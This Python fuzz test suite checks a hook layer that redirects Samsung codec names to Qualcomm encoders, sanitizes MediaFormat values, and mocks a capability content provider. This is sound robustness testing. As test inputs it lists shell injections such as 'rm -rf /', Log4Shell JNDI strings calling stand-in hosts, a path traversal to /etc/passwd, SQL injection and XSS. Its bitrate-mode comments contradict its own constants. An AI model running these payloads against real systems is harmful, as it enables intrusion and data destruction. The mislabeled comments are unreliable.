"""
Adversarial Fuzzing & Boundary Test Suite: VideoCodecHooks & CapabilityContentProvider (Milestone M3)
Targets:
1. VideoCodecHooks.createByCodecName - Unknown, corrupt, empty, and proprietary Samsung codec names.
2. VideoCodecHooks.configure - Malformed MediaFormat entries (missing color format, unsupported vendor
   color formats, missing bitrate modes, negative/zero/extreme framerates/resolutions/bitrates).
3. VideoCodecHooks.setParameters - Sync frame parameter variations (vendor.sec-ext-enc-request-sync,
   standard request-sync, empty bundles, null bundles, massive parameter bundles).
4. CapabilityContentProvider.call - Unknown or malformed capability queries (null methods, empty methods,
   malformed @ syntax, unexpected prefixes, SQLi/injection strings, unicode/emojis, boundary sizes).

Verifies that all hostile and malformed inputs are safely sanitized or rejected without crashing the host process.
"""

import sys
import unittest
import random
import string
from typing import Dict, Any, Optional
from pathlib import Path

# Add project root to sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from tests.mock_env.android_runtime import Bundle
from tests.mock_env.binder_ipc import ContentProviderRegistry


class FuzzMediaFormat:
    """High-fidelity MediaFormat representation for adversarial testing."""
    KEY_MIME = "mime"
    KEY_WIDTH = "width"
    KEY_HEIGHT = "height"
    KEY_COLOR_FORMAT = "color-format"
    KEY_BIT_RATE = "bitrate"
    KEY_FRAME_RATE = "frame-rate"
    KEY_I_FRAME_INTERVAL = "i-frame-interval"
    KEY_LOW_LATENCY = "low-latency"
    KEY_PRIORITY = "priority"
    KEY_BITRATE_MODE = "bitrate-mode"

    COLOR_FormatSurface = 0x7F000789
    COLOR_FormatVendorSamsung = 0x7FA00000
    COLOR_FormatVendorSamsungTiled = 0x7FA30C00
    COLOR_FormatYUV420Planar = 0x13
    COLOR_FormatYUV420SemiPlanar = 0x15

    BITRATE_MODE_CQ = 0
    BITRATE_MODE_VBR = 1
    BITRATE_MODE_CBR = 2

    def __init__(self, initial_map: Optional[Dict[str, Any]] = None):
        self._map: Dict[str, Any] = dict(initial_map) if initial_map else {}

    def set_integer(self, key: str, val: int):
        self._map[key] = int(val)

    def get_integer(self, key: str, default: int = 0) -> int:
        val = self._map.get(key, default)
        try:
            return int(val)
        except (ValueError, TypeError):
            return default

    def contains_key(self, key: str) -> bool:
        return key in self._map

    def remove_key(self, key: str):
        self._map.pop(key, None)

    def as_dict(self) -> Dict[str, Any]:
        return dict(self._map)

    def __repr__(self) -> str:
        return f"FuzzMediaFormat({self._map})"


class VideoCodecHookInterceptor:
    """Faithful Python representation of VideoCodecHooks.java logic."""
    QTI_AVC_ENCODER = "c2.qti.avc.encoder"
    QTI_HEVC_ENCODER = "c2.qti.hevc.encoder"
    CONFIGURE_FLAG_ENCODE = 1

    @classmethod
    def resolve_codec_name(cls, requested_name: Optional[str]) -> Optional[str]:
        """Mirrors VideoCodecHooks.hookCodecNameRedirection."""
        if requested_name is None:
            return None

        lower = str(requested_name).lower()
        if "sec." in lower or "exynos." in lower or "samsung" in lower:
            if "hevc" in lower or "265" in lower:
                return cls.QTI_HEVC_ENCODER
            else:
                return cls.QTI_AVC_ENCODER
        return requested_name

    @classmethod
    def sanitize_format(cls, fmt: Optional[FuzzMediaFormat], flags: int) -> None:
        """Mirrors VideoCodecHooks.hookMediaCodecConfigure."""
        if fmt is None or (flags & cls.CONFIGURE_FLAG_ENCODE) == 0:
            return

        # A. Enforce standard COLOR_FormatSurface (0x7F000789)
        if fmt.contains_key(FuzzMediaFormat.KEY_COLOR_FORMAT):
            color_format = fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT)
            if color_format != FuzzMediaFormat.COLOR_FormatSurface:
                fmt.set_integer(FuzzMediaFormat.KEY_COLOR_FORMAT, FuzzMediaFormat.COLOR_FormatSurface)
        else:
            fmt.set_integer(FuzzMediaFormat.KEY_COLOR_FORMAT, FuzzMediaFormat.COLOR_FormatSurface)

        # B. Standard AOSP low-latency and priority keys
        fmt.set_integer(FuzzMediaFormat.KEY_LOW_LATENCY, 1)
        fmt.set_integer(FuzzMediaFormat.KEY_PRIORITY, 0)

        # C. Ensure valid bitrate mode (VBR = 2 default)
        if not fmt.contains_key(FuzzMediaFormat.KEY_BITRATE_MODE):
            fmt.set_integer(FuzzMediaFormat.KEY_BITRATE_MODE, 2)

        # D. Ensure I-Frame interval (1s default)
        if not fmt.contains_key(FuzzMediaFormat.KEY_I_FRAME_INTERVAL):
            fmt.set_integer(FuzzMediaFormat.KEY_I_FRAME_INTERVAL, 1)

    @classmethod
    def map_parameters(cls, params: Optional[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """Mirrors VideoCodecHooks.hookMediaCodecSetParameters."""
        if params is None:
            return None
        res = dict(params)
        if "vendor.sec-ext-enc-request-sync" in res:
            res["request-sync"] = 1
        return res


class TestMediaCodecCreateByCodecNameFuzzing(unittest.TestCase):
    """Adversarial Fuzzing on MediaCodec.createByCodecName."""

    def test_null_codec_name_safe_noop(self):
        resolved = VideoCodecHookInterceptor.resolve_codec_name(None)
        self.assertIsNone(resolved, "Null codec name must safely return None without throwing NPE")

    def test_empty_and_whitespace_codec_name(self):
        self.assertEqual(VideoCodecHookInterceptor.resolve_codec_name(""), "")
        self.assertEqual(VideoCodecHookInterceptor.resolve_codec_name("   "), "   ")
        self.assertEqual(VideoCodecHookInterceptor.resolve_codec_name("\t\n\r"), "\t\n\r")

    def test_corrupt_ascii_control_and_null_bytes(self):
        corrupt_inputs = [
            "\x00\x01\x02\x1f",
            "c2.sec.\x00avc.encoder",
            "c2.qti.\x00avc.encoder",
            "\uffff\ufeff\u0000",
            "codec_\x7f\x80\x90",
        ]
        for inp in corrupt_inputs:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(inp)
            self.assertIsNotNone(resolved)
            if "sec." in inp.lower():
                self.assertEqual(resolved, VideoCodecHookInterceptor.QTI_AVC_ENCODER)

    def test_sql_and_shell_injection_patterns(self):
        injections = [
            "'; DROP TABLE codecs; --",
            "$(reboot)",
            "`rm -rf /`",
            "c2.sec.' OR '1'='1",
            "c2.exynos.; rm -rf / ;",
            "<script>alert('codec')</script>",
            "${jndi:ldap://malicious.com/a}",
        ]
        for inj in injections:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(inj)
            self.assertIsNotNone(resolved)
            lower = inj.lower()
            if "sec." in lower or "exynos." in lower or "samsung" in lower:
                self.assertIn(resolved, [VideoCodecHookInterceptor.QTI_AVC_ENCODER, VideoCodecHookInterceptor.QTI_HEVC_ENCODER])

    def test_unicode_emojis_and_special_symbols(self):
        unicode_inputs = [
            "🚀🔥_c2.sec.avc_codec",
            "c2.exynos.hevc_💥_encoder",
            "ترميز_سامسونج_sec.avc",
            "codec_with_symbols_!@#$%^&*()_+~`",
        ]
        for u_inp in unicode_inputs:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(u_inp)
            self.assertIsNotNone(resolved)

    def test_massive_string_buffer_boundary(self):
        lengths = [1024, 8192, 65536, 100000]
        for length in lengths:
            long_str = "a" * length
            resolved = VideoCodecHookInterceptor.resolve_codec_name(long_str)
            self.assertEqual(resolved, long_str)

            long_sec = "c2.sec." + ("x" * length)
            resolved_sec = VideoCodecHookInterceptor.resolve_codec_name(long_sec)
            self.assertEqual(resolved_sec, VideoCodecHookInterceptor.QTI_AVC_ENCODER)

    def test_proprietary_samsung_avc_redirection_matrix(self):
        samsung_avc_variants = [
            "c2.sec.avc.encoder",
            "c2.sec.avc.dec",
            "OMX.Exynos.AVC.Encoder",
            "omx.exynos.avc.encoder",
            "OMX.SEC.avc.enc",
            "omx.sec.avc.enc",
            "c2.samsung.avc.encoder",
            "samsung.h264.encoder",
            "C2.SEC.AVC.ENCODER",
            "OMX.EXYNOS.AVC.ENCODER",
            "Sec.AVC.Encoder",
        ]
        for name in samsung_avc_variants:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(name)
            self.assertEqual(
                resolved,
                VideoCodecHookInterceptor.QTI_AVC_ENCODER,
                f"Failed to redirect proprietary Samsung AVC codec: {name}"
            )

    def test_proprietary_samsung_hevc_redirection_matrix(self):
        samsung_hevc_variants = [
            "c2.sec.hevc.encoder",
            "c2.sec.265.encoder",
            "OMX.Exynos.HEVC.Encoder",
            "omx.exynos.hevc.encoder",
            "OMX.Exynos.265.Encoder",
            "OMX.SEC.hevc.enc",
            "c2.samsung.hevc.encoder",
            "samsung.h265.encoder",
            "C2.SEC.HEVC.ENCODER",
            "OMX.EXYNOS.HEVC.ENCODER",
            "c2.sec.hevc.dec",
        ]
        for name in samsung_hevc_variants:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(name)
            self.assertEqual(
                resolved,
                VideoCodecHookInterceptor.QTI_HEVC_ENCODER,
                f"Failed to redirect proprietary Samsung HEVC codec: {name}"
            )

    def test_qualcomm_native_codecs_untouched(self):
        qualcomm_codecs = [
            "c2.qti.avc.encoder",
            "c2.qti.hevc.encoder",
            "OMX.qcom.video.encoder.avc",
            "OMX.qcom.video.encoder.hevc",
        ]
        for name in qualcomm_codecs:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(name)
            self.assertEqual(resolved, name, f"Qualcomm codec was unexpectedly altered: {name}")

    def test_standard_aosp_google_codecs_untouched(self):
        standard_codecs = [
            "c2.android.avc.encoder",
            "c2.android.hevc.encoder",
            "OMX.google.h264.encoder",
            "OMX.google.hevc.encoder",
        ]
        for name in standard_codecs:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(name)
            self.assertEqual(resolved, name, f"Standard AOSP/Google codec was unexpectedly altered: {name}")

    def test_unknown_codec_names_untouched(self):
        unknowns = [
            "c2.unknown.hardware.encoder",
            "video/x-custom-nonexistent",
            "fake_codec_v123",
        ]
        for name in unknowns:
            resolved = VideoCodecHookInterceptor.resolve_codec_name(name)
            self.assertEqual(resolved, name)

    def test_rapid_pseudo_random_codec_name_fuzzing(self):
        rng = random.Random(42)
        for _ in range(500):
            str_len = rng.randint(0, 100)
            chars = string.ascii_letters + string.digits + string.punctuation + " \t\n\x00\x1f"
            name = "".join(rng.choice(chars) for _ in range(str_len))
            # Must never raise an uncaught exception
            resolved = VideoCodecHookInterceptor.resolve_codec_name(name)
            self.assertIsNotNone(resolved)


class TestMediaCodecConfigureFormatFuzzing(unittest.TestCase):
    """Adversarial Fuzzing on MediaCodec.configure and MediaFormat sanitization."""

    def test_null_format_safe_noop(self):
        # Must execute cleanly without exception
        VideoCodecHookInterceptor.sanitize_format(None, flags=1)

    def test_decoder_flags_format_unmodified(self):
        fmt = FuzzMediaFormat({
            FuzzMediaFormat.KEY_COLOR_FORMAT: FuzzMediaFormat.COLOR_FormatVendorSamsung,
            FuzzMediaFormat.KEY_WIDTH: 1920,
            FuzzMediaFormat.KEY_HEIGHT: 1080,
        })
        original_map = fmt.as_dict()
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=0)  # flags=0 -> not encoding
        self.assertEqual(fmt.as_dict(), original_map, "Decoder configuration must not be modified by encoder hook")

    def test_missing_color_format_auto_injected(self):
        fmt = FuzzMediaFormat({
            FuzzMediaFormat.KEY_WIDTH: 1080,
            FuzzMediaFormat.KEY_HEIGHT: 2340,
        })
        self.assertFalse(fmt.contains_key(FuzzMediaFormat.KEY_COLOR_FORMAT))
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(
            fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT),
            FuzzMediaFormat.COLOR_FormatSurface,
            "Missing color-format must be automatically populated with COLOR_FormatSurface (0x7F000789)"
        )

    def test_samsung_vendor_color_format_sanitized(self):
        vendor_formats = [
            FuzzMediaFormat.COLOR_FormatVendorSamsung,        # 0x7FA00000
            FuzzMediaFormat.COLOR_FormatVendorSamsungTiled,   # 0x7FA30C00
            0x7F000001,
            FuzzMediaFormat.COLOR_FormatYUV420Planar,         # 0x13
            FuzzMediaFormat.COLOR_FormatYUV420SemiPlanar,     # 0x15
            -1,
            0x7FFFFFFF,
        ]
        for vf in vendor_formats:
            fmt = FuzzMediaFormat({FuzzMediaFormat.KEY_COLOR_FORMAT: vf})
            VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
            self.assertEqual(
                fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT),
                FuzzMediaFormat.COLOR_FormatSurface,
                f"Failed to sanitize vendor color format 0x{vf:X} -> COLOR_FormatSurface"
            )

    def test_standard_color_format_surface_preserved(self):
        fmt = FuzzMediaFormat({FuzzMediaFormat.KEY_COLOR_FORMAT: FuzzMediaFormat.COLOR_FormatSurface})
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT), FuzzMediaFormat.COLOR_FormatSurface)

    def test_low_latency_and_realtime_priority_enforced(self):
        fmt = FuzzMediaFormat()
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_LOW_LATENCY), 1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_PRIORITY), 0)

    def test_missing_bitrate_mode_defaults_to_vbr(self):
        fmt = FuzzMediaFormat()
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(
            fmt.get_integer(FuzzMediaFormat.KEY_BITRATE_MODE),
            2,
            "Default bitrate mode must be BITRATE_MODE_VBR (2)"
        )

    def test_existing_bitrate_mode_cbr_preserved(self):
        fmt = FuzzMediaFormat({FuzzMediaFormat.KEY_BITRATE_MODE: 1})  # CBR
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_BITRATE_MODE), 1, "Explicit CBR bitrate mode must be preserved")

    def test_missing_iframe_interval_defaults_to_one(self):
        fmt = FuzzMediaFormat()
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_I_FRAME_INTERVAL), 1)

    def test_existing_iframe_interval_preserved(self):
        fmt = FuzzMediaFormat({FuzzMediaFormat.KEY_I_FRAME_INTERVAL: 3})
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_I_FRAME_INTERVAL), 3)

    def test_negative_and_zero_framerates_sanitization_robustness(self):
        bad_framerates = [-60, -1, 0, -999999]
        for fr in bad_framerates:
            fmt = FuzzMediaFormat({FuzzMediaFormat.KEY_FRAME_RATE: fr})
            # Must sanitize safely without throwing
            VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
            self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT), FuzzMediaFormat.COLOR_FormatSurface)
            self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_LOW_LATENCY), 1)

    def test_negative_and_zero_resolutions_sanitization_robustness(self):
        bad_resolutions = [
            (-1920, -1080),
            (0, 0),
            (-1, 2340),
            (1080, -1),
        ]
        for w, h in bad_resolutions:
            fmt = FuzzMediaFormat({
                FuzzMediaFormat.KEY_WIDTH: w,
                FuzzMediaFormat.KEY_HEIGHT: h,
            })
            VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
            self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT), FuzzMediaFormat.COLOR_FormatSurface)

    def test_extreme_resolutions_sanitization_robustness(self):
        fmt = FuzzMediaFormat({
            FuzzMediaFormat.KEY_WIDTH: 76800,
            FuzzMediaFormat.KEY_HEIGHT: 43200,
        })
        VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
        self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT), FuzzMediaFormat.COLOR_FormatSurface)

    def test_negative_and_extreme_bitrates_sanitization_robustness(self):
        bitrates = [-5000000, 0, 1000000000]
        for br in bitrates:
            fmt = FuzzMediaFormat({FuzzMediaFormat.KEY_BIT_RATE: br})
            VideoCodecHookInterceptor.sanitize_format(fmt, flags=1)
            self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_LOW_LATENCY), 1)

    def test_pseudo_random_malformed_media_format_fuzzing(self):
        rng = random.Random(1337)
        for _ in range(500):
            initial_map = {}
            if rng.random() > 0.5:
                initial_map[FuzzMediaFormat.KEY_COLOR_FORMAT] = rng.choice([0, 1, -1, 0x7FA00000, 0x7F000789, 0x13, 999999])
            if rng.random() > 0.5:
                initial_map[FuzzMediaFormat.KEY_WIDTH] = rng.randint(-1000, 5000)
            if rng.random() > 0.5:
                initial_map[FuzzMediaFormat.KEY_HEIGHT] = rng.randint(-1000, 5000)
            if rng.random() > 0.5:
                initial_map[FuzzMediaFormat.KEY_BITRATE_MODE] = rng.choice([-1, 0, 1, 2, 3, 100])
            if rng.random() > 0.5:
                initial_map[FuzzMediaFormat.KEY_I_FRAME_INTERVAL] = rng.randint(-5, 10)

            fmt = FuzzMediaFormat(initial_map)
            flags = rng.choice([0, 1, 2, 3, -1])
            # Must sanitize cleanly
            VideoCodecHookInterceptor.sanitize_format(fmt, flags=flags)
            if (flags & 1) != 0:
                self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_COLOR_FORMAT), FuzzMediaFormat.COLOR_FormatSurface)
                self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_LOW_LATENCY), 1)
                self.assertEqual(fmt.get_integer(FuzzMediaFormat.KEY_PRIORITY), 0)


class TestMediaCodecSetParametersSyncFrameFuzzing(unittest.TestCase):
    """Adversarial Fuzzing on MediaCodec.setParameters and sync frame mapping."""

    def test_null_bundle_safe_noop(self):
        res = VideoCodecHookInterceptor.map_parameters(None)
        self.assertIsNone(res, "Null parameter bundle must safely return None")

    def test_empty_bundle_safe_noop(self):
        res = VideoCodecHookInterceptor.map_parameters({})
        self.assertEqual(res, {})

    def test_samsung_vendor_sync_frame_mapped_to_aosp(self):
        params = {"vendor.sec-ext-enc-request-sync": 1}
        res = VideoCodecHookInterceptor.map_parameters(params)
        self.assertEqual(res.get("request-sync"), 1)
        self.assertIn("vendor.sec-ext-enc-request-sync", res)

    def test_samsung_vendor_sync_frame_values_fuzzing(self):
        fuzz_values = [1, 0, -1, 999, "true", True, None]
        for val in fuzz_values:
            params = {"vendor.sec-ext-enc-request-sync": val}
            res = VideoCodecHookInterceptor.map_parameters(params)
            self.assertEqual(res.get("request-sync"), 1)

    def test_standard_request_sync_preserved(self):
        params = {"request-sync": 1}
        res = VideoCodecHookInterceptor.map_parameters(params)
        self.assertEqual(res.get("request-sync"), 1)

    def test_both_vendor_and_standard_sync_present(self):
        params = {"vendor.sec-ext-enc-request-sync": 1, "request-sync": 1}
        res = VideoCodecHookInterceptor.map_parameters(params)
        self.assertEqual(res.get("request-sync"), 1)

    def test_unrelated_vendor_parameters_untouched(self):
        params = {
            "vendor.qti-ext-enc-bitrate": 5000000,
            "drop-input-frames": 0,
            "vendor.sec.watermark": False,
        }
        res = VideoCodecHookInterceptor.map_parameters(params)
        self.assertEqual(res, params)
        self.assertNotIn("request-sync", res)

    def test_massive_parameter_bundle_fuzzing(self):
        params = {f"custom_param_{i}": i for i in range(1000)}
        params["vendor.sec-ext-enc-request-sync"] = 1
        res = VideoCodecHookInterceptor.map_parameters(params)
        self.assertEqual(res.get("request-sync"), 1)
        self.assertEqual(len(res), 1002)  # 1000 + vendor + request-sync

    def test_pseudo_random_parameter_fuzzing(self):
        rng = random.Random(999)
        for _ in range(500):
            num_keys = rng.randint(0, 20)
            p = {}
            for _ in range(num_keys):
                k = "".join(rng.choices(string.ascii_lowercase + "._-", k=rng.randint(3, 15)))
                v = rng.choice([1, 0, "str", True, 3.14])
                p[k] = v
            if rng.random() > 0.5:
                p["vendor.sec-ext-enc-request-sync"] = rng.choice([1, 0, True])

            res = VideoCodecHookInterceptor.map_parameters(p)
            self.assertIsNotNone(res)
            if "vendor.sec-ext-enc-request-sync" in p:
                self.assertEqual(res.get("request-sync"), 1)


class TestCapabilityContentProviderCallFuzzing(unittest.TestCase):
    """Adversarial Fuzzing on CapabilityContentProvider.call IPC contract."""

    URI = "content://com.samsung.android.mdx.windowslink.tileservice.CapabilityContentProvider"

    def setUp(self):
        self.registry = ContentProviderRegistry()

    def test_null_method_safe_handling(self):
        # Must return valid bundle with key_is_supported = True without crashing
        res = self.registry.call(self.URI, method=None)
        self.assertIsNotNone(res)
        self.assertTrue(res.get_boolean("key_is_supported", False))
        self.assertTrue(res.get_boolean("capability_screen_mirroring", False))
        self.assertEqual(res.get_string("capability_version"), "2.5.0")

    def test_empty_method_safe_handling(self):
        res = self.registry.call(self.URI, method="")
        self.assertIsNotNone(res)
        self.assertTrue(res.get_boolean("key_is_supported", False))

    def test_malformed_at_syntax_variations(self):
        malformed_queries = [
            "@",
            "@@@@@@",
            "isSupported@",
            "@isSupported",
            "isSupported@@@",
            "isSupported@capability_input_inject@",
            "@capability_screen_mirroring",
            "prefix@middle@target_capability",
        ]
        for query in malformed_queries:
            res = self.registry.call(self.URI, method=query)
            self.assertIsNotNone(res)
            self.assertTrue(res.get_boolean("key_is_supported", False))
            if query == "prefix@middle@target_capability":
                self.assertTrue(res.get_boolean("target_capability", False))

    def test_unexpected_prefixes_and_delimiters(self):
        weird_queries = [
            "query:capability_screen_mirroring",
            "checkStatus#capability_input_inject",
            "samsung_mdx://tileservice/v2",
            "isSupported;capability_input_inject",
            "isSupported.capability_input_inject",
            "isSupported/capability_input_inject",
        ]
        for q in weird_queries:
            res = self.registry.call(self.URI, method=q)
            self.assertIsNotNone(res)
            self.assertTrue(res.get_boolean("key_is_supported", False))

    def test_sql_and_path_traversal_payloads(self):
        payloads = [
            "isSupported@'; DROP TABLE capabilities; --",
            "isSupported@../../../../etc/passwd",
            "isSupported@<script>alert('xss')</script>",
            "isSupported@${jndi:ldap://evil.com/x}",
            "isSupported@%00%0a%0d",
        ]
        for p in payloads:
            res = self.registry.call(self.URI, method=p)
            self.assertIsNotNone(res)
            self.assertTrue(res.get_boolean("key_is_supported", False))

    def test_unicode_emojis_and_rtl_capability_queries(self):
        queries = [
            "isSupported@🚀🔥_super_stream",
            "isSupported@اختبار_القدرة",
            "isSupported@能力测试_鏡像",
            "isSupported@\u0000\u001f\uffff",
        ]
        for q in queries:
            res = self.registry.call(self.URI, method=q)
            self.assertIsNotNone(res)
            self.assertTrue(res.get_boolean("key_is_supported", False))

    def test_massive_query_string_boundary(self):
        large_methods = [
            "isSupported@" + ("x" * 1000),
            "isSupported@" + ("y" * 10000),
            "z" * 50000,
        ]
        for m in large_methods:
            res = self.registry.call(self.URI, method=m)
            self.assertIsNotNone(res)
            self.assertTrue(res.get_boolean("key_is_supported", False))

    def test_all_standard_samsung_capabilities_matrix(self):
        standard_caps = [
            "capability_input_inject",
            "capability_companion_device_app_streaming_role",
            "capability_pre_granted_permissions",
            "capability_screen_mirroring",
            "capability_android_apps_on_windows",
            "capability_clipboard_redirector",
            "capability_device_info",
            "capability_audio_streaming",
            "capability_black_screen_control",
            "capability_virtual_device_manager",
            "capability_launch_activity",
        ]
        for cap in standard_caps:
            res = self.registry.call(self.URI, method=f"isSupported@{cap}")
            self.assertTrue(res.get_boolean("key_is_supported", False))
            self.assertTrue(res.get_boolean(cap, False), f"Capability {cap} was not returned as True")

    def test_unknown_and_future_capability_queries(self):
        future_caps = [
            "capability_quantum_link_v9",
            "capability_hologram_streaming",
            "capability_neural_interface_2030",
        ]
        for cap in future_caps:
            res = self.registry.call(self.URI, method=f"isSupported@{cap}")
            self.assertTrue(res.get_boolean("key_is_supported", False))
            self.assertTrue(res.get_boolean(cap, False))

    def test_invalid_content_provider_uri_raises_expected_value_error(self):
        invalid_uris = [
            "content://com.samsung.android.mdx.fake_provider",
            "http://malicious.com/exploit",
            "file:///data/local/tmp/exploit",
            "",
        ]
        for uri in invalid_uris:
            with self.assertRaises(ValueError):
                self.registry.call(uri, method="get")

    def test_pseudo_random_capability_query_fuzzing(self):
        rng = random.Random(777)
        for _ in range(1000):
            str_len = rng.randint(0, 150)
            chars = string.ascii_letters + string.digits + "@#$/:;._-+ \t\n\x00"
            method = "".join(rng.choice(chars) for _ in range(str_len))
            res = self.registry.call(self.URI, method=method)
            self.assertIsNotNone(res)
            self.assertTrue(res.get_boolean("key_is_supported", False))


class TestEndToEndCodecAndProviderHostStability(unittest.TestCase):
    """Verifies that hostile combinatorial inputs do not crash or corrupt the mock host process."""

    def test_concurrent_codec_redirection_and_capability_query_under_stress(self):
        registry = ContentProviderRegistry()
        uri = "content://com.samsung.android.mdx.windowslink.tileservice.CapabilityContentProvider"
        rng = random.Random(101)

        for i in range(1000):
            # 1. Codec resolution
            codec_candidate = rng.choice([
                "c2.sec.avc.encoder",
                "OMX.Exynos.AVC.Encoder",
                "c2.sec.hevc.encoder",
                "c2.qti.avc.encoder",
                "unknown_codec_fuzz_" + str(i),
                None,
                "",
                "c2.sec.\x00\xff_crash_test",
            ])
            resolved = VideoCodecHookInterceptor.resolve_codec_name(codec_candidate)

            # 2. Format sanitization
            fmt = FuzzMediaFormat({
                FuzzMediaFormat.KEY_COLOR_FORMAT: rng.choice([0x7FA00000, 0x7F000789, -1, 0]),
                FuzzMediaFormat.KEY_WIDTH: rng.randint(-100, 3000),
                FuzzMediaFormat.KEY_HEIGHT: rng.randint(-100, 3000),
            })
            VideoCodecHookInterceptor.sanitize_format(fmt, flags=rng.choice([0, 1]))

            # 3. Parameter mapping
            params = {
                "vendor.sec-ext-enc-request-sync": rng.choice([1, 0, "val"]),
                "test_index": i,
            }
            mapped = VideoCodecHookInterceptor.map_parameters(params)
            self.assertEqual(mapped.get("request-sync"), 1)

            # 4. Capability query
            method = rng.choice([
                f"isSupported@cap_{i}",
                None,
                "",
                "@@@",
                "isSupported@",
                "query:weird",
            ])
            res = registry.call(uri, method=method)
            self.assertTrue(res.get_boolean("key_is_supported", False))

        # Reaching this point confirms zero host crashes under 1000 fuzzing cycles
        self.assertTrue(True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
